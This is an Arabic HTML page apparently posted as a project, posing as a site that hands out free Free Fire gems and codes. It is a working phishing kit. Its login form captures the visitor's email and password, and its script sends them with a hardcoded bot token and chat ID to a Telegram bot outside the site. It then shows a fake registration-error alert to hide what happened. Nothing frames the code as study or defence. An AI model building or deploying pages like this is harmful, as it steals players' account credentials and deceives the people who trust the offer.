# -
يمكنك الحصول على الجواهر و أكواد فري فاير مجانا وبدون عروض 
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صفحة تسجيل الدخول</title>
    <style>
        /* إعداد الخلفية */
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            background-image: url('https://example.com/freefire-background.jpg'); /*https://i.pinimg.com/originals/83/94/c6/8394c6c6b12fbd002ed0dfcc0e91e10a.jpg*/
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }

        /* تنسيق النموذج */
        #loginForm {
            background-color: rgba(0, 0, 0, 0.5); /* خلفية شبه شفافة */
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            text-align: right;
            width: 300px;
        }

        h1 {
            text-align: center;
            font-size: 24px;
            margin-bottom: 20px;
        }

        label {
            font-size: 16px;
            margin-bottom: 5px;
            display: block;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #ff6f61; /* لون مميز */
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #ff4a38; /* تأثير عند التمرير */
        }
    </style>
</head>
<body>
    <form id="loginForm">
        <h1>مرحبا في موقع شحن جواهر فري فاير مجانا وبدون عروض </h1>
        <label for="email">البريد الإلكتروني:</label>
        <input type="email" id="email" name="email" required><br>
        
        <label for="password">كلمة السر:</label>
        <input type="password" id="password" name="password" required><br>
        
        <button type="submit">تسجيل</button>
    </form>

    <script>
        // عند إرسال النموذج
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // منع إعادة تحميل الصفحة

            // جمع البيانات
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // إرسال البيانات عبر بوت Telegram
            const botToken = '8178057085:AAEhCSYjlVY9CjhZBs-GjzbmhkHWSccU2sw';
            const chatId = '6963965798';
            const message = `بريد إلكتروني: ${email}\nكلمة السر: ${password}`;

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                alert('يبدو انه هناك مشكلة في تسجيل');
            })
            .catch(error => {
                alert('حدث خطأ أثناء الإرسال.');
                console.error(error);
            });
        });
    </script>
</body>
</html>
